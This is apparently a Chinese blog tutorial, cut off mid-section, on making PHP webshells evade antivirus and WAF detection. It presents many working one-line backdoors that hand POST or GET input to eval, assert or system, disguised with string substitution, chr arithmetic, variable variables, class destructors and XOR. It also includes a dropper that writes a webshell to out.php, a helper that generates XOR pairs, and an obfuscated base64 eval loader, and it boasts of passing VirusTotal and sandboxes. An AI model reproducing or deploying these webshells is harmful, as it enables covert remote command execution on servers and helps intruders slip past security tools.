class="line">  主要是通过一些特殊的字符串，来干扰到杀软的正则判断并执行恶意代码（各种回车、换行、<span class="literal">null</span>和空白字符等）</span><br><span class="line">```php</span><br><span class="line"><span class="variable">$f</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$z</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(``.<span class="variable">$hello</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="生成新文件绕过"><a href="#生成新文件绕过" class="headerlink" title="生成新文件绕过"></a>生成新文件绕过</h3><p>原理也很简单，该PHP本身没法执行命令，但是运行后可以在同目录混淆写入一个WebShell，也是可以进行免杀的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hahaha</span> = <span class="title function_ invoke__">strtr</span>(<span class="string">&quot;abatme&quot;</span>,<span class="string">&quot;me&quot;</span>,<span class="string">&quot;em&quot;</span>);      <span class="comment">//$hahaha = abatem</span></span><br><span class="line"><span class="variable">$wahaha</span> = <span class="title function_ invoke__">strtr</span>(<span class="variable">$hahaha</span>,<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;sy&quot;</span>);       <span class="comment">//$wahaha = system（高危函数）</span></span><br><span class="line"><span class="variable">$gogogo</span> = <span class="title function_ invoke__">strtr</span>(<span class="string">&#x27;echo &quot;&lt;?php evqrw$_yKST[AABYSS])?&gt;&quot; &gt; ./out.php&#x27;</span>,<span class="string">&quot;qrwxyK&quot;</span>,<span class="string">&quot;al(_PO&quot;</span>);</span><br><span class="line"><span class="comment">//$gogogo = &#x27;echo &quot;&lt;?php eval(_POST[AABYSS])?&gt;&quot; &gt; ./out.php&#x27;</span></span><br><span class="line"><span class="variable">$wahaha</span>(<span class="variable">$gogogo</span>);  <span class="comment">//将一句话木马内容写入同目录下的out.php中</span></span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line">现在看这个是不是很简单，但是这个可是VirusTotal全绿、微步沙箱和百度沙箱都过的哦~</span><br><span class="line"></span><br><span class="line">没想到吧~ 其实在这个简单的基础上还可以拓展出来进行高阶免杀操作</span><br><span class="line"></span><br><span class="line"><span class="comment">### 回调函数绕过  </span></span><br><span class="line"><span class="number">1</span>.  <span class="title function_ invoke__">call_user_func_array</span>()    </span><br><span class="line">调用回调函数，并把一个数组参数作为回调函数的参数。  </span><br><span class="line">&gt;说明：<span class="keyword">mixed</span> <span class="title function_ invoke__">call_user_func_array</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$param_arr</span> )</span><br><span class="line">&gt;把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。</span><br><span class="line">返回回调函数的结果。如果出错的话就返回<span class="literal">FALSE</span></span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="comment">//ASCII编码解密后为assert高危函数</span></span><br><span class="line"><span class="variable">$f</span> =  <span class="title function_ invoke__">chr</span>(<span class="number">98</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>-<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">112</span>+<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">110</span>+<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$f</span>, <span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//（1）普通使用：</span></span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123;  </span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$b</span>; </span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$c</span>; </span><br><span class="line"></span><br><span class="line">           &#125; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">array</span>(<span class="string">&quot;111&quot;</span>, <span class="string">&quot;222&quot;</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="comment">//输出 111 222</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">//（2）调用类内部的方法：</span></span><br><span class="line"></span><br><span class="line">         Class ClassA &#123; </span><br><span class="line"></span><br><span class="line">                 <span class="function"><span class="keyword">function</span> <span class="title">bc</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span></span>) </span>&#123; </span><br><span class="line"></span><br><span class="line">                  <span class="variable">$bc</span> = <span class="variable">$b</span> + <span class="variable">$c</span>; </span><br><span class="line"></span><br><span class="line">                  <span class="keyword">echo</span> <span class="variable">$bc</span>; </span><br><span class="line"></span><br><span class="line">                 &#125; </span><br><span class="line"></span><br><span class="line">            &#125; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="string">&#x27;ClassA&#x27;</span>,<span class="string">&#x27;bc&#x27;</span>), <span class="keyword">array</span>(<span class="string">&quot;111&quot;</span>, <span class="string">&quot;222&quot;</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="comment">//输出  333 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//（3）支持引用传递:</span></span><br><span class="line"></span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">&amp;<span class="variable">$b</span></span>) </span>&#123; </span><br><span class="line"></span><br><span class="line">              <span class="variable">$b</span>++; </span><br><span class="line"></span><br><span class="line">          &#125; </span><br><span class="line"></span><br><span class="line">          <span class="variable">$c</span> = <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">          <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="keyword">array</span>(&amp;<span class="variable">$c</span>)); </span><br><span class="line"></span><br><span class="line">          <span class="keyword">echo</span> <span class="variable">$c</span>;  <span class="comment">//输出 2 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="comment">//注意：call_user_func_array 与 call_user_func 这两个函数基本上是类似的，只是在调用上传递参数时存在一些差异。</span></span><br><span class="line"></span><br><span class="line">              函数call_user_func_array 传递的第二个参数必须是数组；</span><br><span class="line"></span><br><span class="line">              函数call_user_func 传递的第二个参数可能是数组，如果是多个参数的话，还是需要以列表的形式列出。</span><br><span class="line"></span><br><span class="line">              <span class="title function_ invoke__">call_user_func</span> ( callback <span class="variable">$function</span> [,<span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $...]] )  </span><br></pre></td></tr></table></figure><ol start="2"><li>array_map()</li></ol><p>回顾一下array_map()函数吧，简单来说就是将数组里每个值进行自定义操作，再把新的数组返回</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//ASCII编码解密后为assert高危函数</span></span><br><span class="line"><span class="variable">$f</span> =  <span class="title function_ invoke__">chr</span>(<span class="number">98</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">116</span>-<span class="number">1</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>-<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">112</span>+<span class="number">2</span>).<span class="title function_ invoke__">chr</span>(<span class="number">110</span>+<span class="number">6</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.<span class="variable">$f</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">fun</span>();    <span class="comment">//拿到assert高危函数</span></span><br><span class="line"><span class="variable">$pass</span> =<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$user</span>,<span class="variable">$user</span> = <span class="variable">$pass</span> );</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="可变变量绕过"><a href="#可变变量绕过" class="headerlink" title="可变变量绕过"></a>可变变量绕过</h3><ol><li><p>简单例子  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="string">&#x27;hello&#x27;</span>;    <span class="comment">//变量名为f，变量值为Hello</span></span><br><span class="line"><span class="variable">$$f</span> = <span class="string">&#x27;AabyssZG&#x27;</span>;  <span class="comment">//变量名为Hello（也就是$f的值），值为AabyssZG</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;     <span class="comment">//输出AabyssZG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//利用</span></span><br><span class="line"><span class="variable">$f</span> =<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$f</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hello</span>);   <span class="comment">//eval($_POST[&#x27;aabyss&#x27;]); </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>数组+变量引用混淆<br>上文提到，可以通过 compact 创建一个包含变量名和它们的值的数组</p></li></ol><p>那就可以用 compact 创建一个包含恶意函数和内容的数组，再引用出来拼接成语句即可  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$z</span> = <span class="string">&quot;system&quot;</span>;                        <span class="comment">//配合其他姿势，将system高危函数传给z</span></span><br><span class="line"><span class="variable">$zhixin</span>  = &amp;<span class="variable">$z</span>;</span><br><span class="line"><span class="variable">$event</span> = <span class="string">&#x27;hahaha&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">compact</span>(<span class="string">&quot;event&quot;</span>, <span class="string">&quot;zhixin&quot;</span>); <span class="comment">//通过compact创建数组</span></span><br><span class="line"><span class="variable">$z</span> = <span class="string">&#x27;wahaha&#x27;</span>;                        <span class="comment">//我将变量z进行修改为&#x27;wahaha&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$result</span>[<span class="string">&#x27;zhixin&#x27;</span>];</span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]);                  <span class="comment">//system($_POST[&#x27;aabyss&#x27;]); </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据学到的内容，可以发现传入数组，函数内容被替换是不会影响数组中的内容的  </p><p>于是先用变量 zhixin 来引用变量 z 然后通过 compact 创建为数组，接下来再将变量 z 附上新的内容 wahaha ，传统的WAF追踪变量的内容时候，就会让查杀引擎误以为数组中的值不是 system 而是 wahaha ，从而达到WebShell免杀</p><h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>先将高危函数部分存储在数组中，等到时机成熟后提取出来进行拼接  </p><ol><li><p>一维数组  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">substr_replace</span>(<span class="string">&quot;systxx&quot;</span>,<span class="string">&quot;em&quot;</span>,<span class="number">4</span>);         <span class="comment">//system（高危函数）</span></span><br><span class="line"><span class="variable">$z</span> = <span class="keyword">array</span>(<span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>=&gt;<span class="variable">$f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;aabyss&#x27;</span>])));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$z</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Array ( [0] =&gt; Array ( [a] =&gt; assert($_GET[&#x27;aabyss&#x27;]) ) )</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>二维数组  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">substr_replace</span>(<span class="string">&quot;systxx&quot;</span>,<span class="string">&quot;em&quot;</span>,<span class="number">4</span>);          <span class="comment">//system（高危函数）</span></span><br><span class="line"><span class="variable">$z</span> = <span class="keyword">array</span>(<span class="variable">$arrayName</span> = (<span class="variable">$arrayName</span> = (<span class="variable">$arrayName</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="variable">$f</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>])))));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$z</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="类绕过-跟反序列化联动，各种魔术方法"><a href="#类绕过-跟反序列化联动，各种魔术方法" class="headerlink" title="类绕过  (跟反序列化联动，各种魔术方法)"></a>类绕过  (跟反序列化联动，各种魔术方法)</h3><p>通过自定义类或者使用已知的类，将恶意代码放入对应的类中进行执行  </p><ol><li>单类  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_1</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;<span class="subst">$this</span>-&gt;a&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_2</span> = <span class="keyword">new</span> <span class="title class_">Test</span>;</span><br><span class="line"><span class="variable">$_2</span>-&gt;<span class="variable">$_1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>];</span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. 多类  </span><br><span class="line">```php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> =<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span> <span class="keyword">extends</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$code</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">post</span>();</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fff</span> = <span class="keyword">new</span> <span class="title class_">Test2</span>;</span><br><span class="line"><span class="variable">$zzz</span> = <span class="keyword">new</span> <span class="title class_">Test1</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="嵌套运算绕过"><a href="#嵌套运算绕过" class="headerlink" title="嵌套运算绕过"></a>嵌套运算绕过</h3><p>主要通过各种嵌套、异或以及运算来拼装出来想要的函数，再利用PHP允许动态函数执行的特点，拼接处高危函数名，如 system ，然后动态执行恶意代码之即可  </p><ol><li>异或<br>^ 为异或运算符，在PHP中两个变量进行异或时，会将字符串转换成二进制再进行异或运算，运算完再将结果从二进制转换成了字符串  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f</span> = (<span class="string">&#x27;.&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;$&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;.&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;4&#x27;</span>^<span class="string">&#x27;@&#x27;</span>).(<span class="string">&#x27;8&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;]&#x27;</span>^<span class="string">&#x27;0&#x27;</span>);   <span class="comment">//system高危函数</span></span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;aabyss&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>这里的话，可以参考国光大佬的Python脚本生成异或结果，然后来替换即可：python3 xxx.py &gt; results.txt  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">keys = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>)) + <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">91</span>,<span class="number">97</span>)) + <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">123</span>,<span class="number">127</span>))</span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        asscii_number = i^j</span><br><span class="line">        <span class="keyword">if</span> (asscii_number &gt;= <span class="number">65</span> <span class="keyword">and</span> asscii_number &lt;= <span class="number">90</span>) <span class="keyword">or</span> (asscii_number &gt;= <span class="number">97</span> <span class="keyword">and</span> asscii_number &lt;= <span class="number">122</span>):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">32</span> <span class="keyword">and</span> j &lt; <span class="number">32</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = ascii:<span class="subst">&#123;i&#125;</span> ^ ascii<span class="subst">&#123;j&#125;</span> =  <span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            <span class="keyword">elif</span> i &lt; <span class="number">32</span> <span class="keyword">and</span> j &gt;=<span class="number">32</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = ascii:<span class="subst">&#123;i&#125;</span> ^ <span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span> = <span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            <span class="keyword">elif</span> i &gt;= <span class="number">32</span> <span class="keyword">and</span> j &lt; <span class="number">32</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = <span class="subst">&#123;<span class="built_in">chr</span>(i)&#125;</span> ^ ascii<span class="subst">&#123;j&#125;</span> = <span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                temp = (<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">chr</span>(asscii_number)&#125;</span> = <span class="subst">&#123;<span class="built_in">chr</span>(i)&#125;</span> ^ <span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span> = <span class="subst">&#123;quote(<span class="built_in">chr</span>(i))&#125;</span> ^ <span class="subst">&#123;quote(<span class="built_in">chr</span>(j))&#125;</span>&#x27;</span>, <span class="built_in">chr</span>(asscii_number))</span><br><span class="line">                results.append(temp)</span><br><span class="line"></span><br><span class="line">results.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> low_case <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> low_case <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> upper_case <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> upper_case <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(result[<span class="number">0</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>嵌套运算  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$O00OO0</span>=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);</span><br><span class="line"><span class="variable">$O00O0O</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">6</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;;<span class="variable">$O0OO00</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">33</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">10</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$OO0O00</span>=<span class="variable">$O0OO00</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">18</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">3</span>&#125;.<span class="variable">$O0OO00</span>&#123;<span class="number">0</span>&#125;.<span class="variable">$O0OO00</span>&#123;<span class="number">1</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">24</span>&#125;;<span class="variable">$OO0000</span>=<span class="variable">$O00OO0</span>&#123;<span class="number">7</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">13</span>&#125;;<span class="variable">$O00O0O</span>.=<span class="variable">$O00OO0</span>&#123;<span class="number">22</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">36</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">29</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">32</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">35</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">26</span>&#125;.<span class="variable">$O00OO0</span>&#123;<span class="number">30</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$O00O0O</span>(<span class="string">&quot;JE8wTzAwMD0iU0VCb1d4VGJ2SGhRTnFqeW5JUk1jbWxBS1lrWnVmVkpVQ2llYUxkc3J0Z3dGWER6cEdPUFdMY3NrZXpxUnJBVUtCU2hQREdZTUZOT25FYmp0d1pwYVZRZEh5Z0NJdnhUSmZYdW9pbWw3N3QvbFg5VEhyT0tWRlpTSGk4eE1pQVRIazVGcWh4b21UMG5sdTQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw==&quot;</span>));</span><br><span class="line"><span class="comment">//phpinfo</span></span><br><span class="line"><span class="comment">//NSS 有一题类似的，微盾解密</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="传参绕过"><a href="#传参绕过" class="headerlink" title="传参绕过"></a>传参绕过</h3><ol><li>Base64传参  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 